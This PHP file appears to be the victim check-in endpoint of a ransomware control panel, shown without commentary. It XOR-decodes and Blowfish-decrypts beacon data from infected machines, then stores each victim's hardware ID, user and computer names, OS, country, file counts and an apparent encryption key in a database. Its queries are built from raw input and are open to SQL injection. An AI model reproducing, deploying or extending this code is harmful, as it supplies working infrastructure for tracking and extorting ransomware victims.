<?php
if(!isset($_SERVER['CONTENT_LENGTH']))
die();

$size = (int)$_SERVER['CONTENT_LENGTH'];

if($size < 88)
die();
require_once("require.php");


$PostData = file_get_contents('php://input');

//===========


$Key = "";
$hwid = "";

for($i = 0; $i < 56; $i++)
{
    $Key .= $PostData[1+$i]  ^ $PostData[0];
}

for($i = 0; $i < 30; $i++)
{
    $hwid .= $PostData[57+$i]  ^ $PostData[0];
}
$hwid = rtrim($hwid, '\0');



$LogData = substr($PostData, 89);
$Decrypted = $LogData;
$l = strlen($Key);
if ($l < 16)
	$Key = str_repeat($Key, ceil(16/$l));

 if (function_exists('mcrypt_encrypt')){
                $Decrypted = mcrypt_decrypt(MCRYPT_BLOWFISH, $Key, $LogData, MCRYPT_MODE_ECB, NULL);
} else {
    $Decrypted = openssl_decrypt($LogData, 'BF-ECB', $Key, OPENSSL_RAW_DATA | OPENSSL_NO_PADDING);
}

$Decrypted = rtrim($Decrypted, "*");
if(isset($_GET['a']) && $_GET['a'] == 0)
{
	echo "a=0";
}
else {
	$line = explode("<~*#*~>", $Decrypted);
    $com_name = count($line) > 0 ? $line[0] : "";
    $user_name = count($line) > 1 ? $line[1] : "";
    $osversion = count($line) > 2 ? GetOSString(intval($line[2])) : "Unknown";
    $hdd = count($line) > 3 ? $line[3] : "";
    $crc32 = count($line) > 4 ? $line[4] : "";
    $owner = count($line) > 5 ? $line[5] : "";
	$filecount = count($line) > 6 ? $line[6] : "0";
	$filevolumn = count($line) > 7 ? $line[7] : "0";
	$lang = count($line) > 8 ? $line[8] : "";
    $ip = count($line) > 9 ? $line[9] : $client_ip;
    $encKey = count($line) > 10 ? bin2hex($line[10]) : "";
    $av = "";
    $Country = CountryName($client_ip);
    $crc32 = strtoupper($crc32);
	$find_result = mysql_num_rows(mysql_query("SELECT hwid FROM device_tb WHERE hwid='$hwid'"));
    $query = "";
	if($find_result>0)
	{
		$query = "UPDATE device_tb SET
		ipaddress='$client_ip',
		os='$osversion',
		country='$Country',
		crc32='$crc32',
		file_count='$filecount',
		file_volumn='$filevolumn',
		pc_lang='$lang',
		updatedAt=$time
		";
        if($encKey !== "" )$query .= " ,enckey='$encKey'";
        $query .= " 	WHERE hwid='$hwid'";
	}
	else
	{
		$query = "insert into `device_tb` (`country`, `ipaddress`,  `owner`,  `hwid`,  `createdAt`,  `os`,  `av`,  `hdd`,`pc_user`,`pc_name`,`updatedAt`,`crc32`,`pc_lang`,`enckey`) VALUES( '"
            .$Country."' , '".$client_ip."' , '".$owner."' , '".$hwid."' , '".$time."' , '".$osversion."' , '".$av."' , '".$hdd."', '".$user_name."', '".$com_name."', '".$time."', '".$crc32."', '".$lang."', '".$enckey."');";
	}
	//filelog("query");filelog($query);
	mysql_query($query) or die(mysql_error());
}
filelog("key");filelog($Key);
filelog("hwid");filelog($hwid);
filelog("Decrypted");filelog($Decrypted);
//echo json_encode($res);
// echo $Decrypted;
$query = "";
//$res = mysql_query($query) or die(mysql_error());

function GetOSString($OS)
{
	
	switch($OS)
	{
		case 1:
			//return("Windows 2000");
            return("Windows Server 2019"); 
		case 2:
			return("Windows XP");

		case 3:
			return("Windows XP Professional x64");

		case 4:
			//return("Windows Server 2003");
            return("Windows Server 2016");
		case 5:
			return("Windows Home Server");

		case 6:
			return("Windows Server 2003 R2");

		case 7:
			return("Windows Vista");

		case 8:
			return("Windows Server 2008");

		case 9:
			return("Windows Server 2008 R2");

		case 10:
			return("Windows 7");

		case 11:
			return("Windows Server 2012");

		case 12:
			return("Windows 8");

		case 13:
			return("Windows 8.1");
        case 14:
			return("Windows Server 2012 R2");    
        case 15:
            return("Windows 10");

          
		default:
			return("Unknown");
	}
}
function fileLog($content){
    //file_put_contents("log.txt" , json_encode($content)."\n" , FILE_APPEND);
}
?>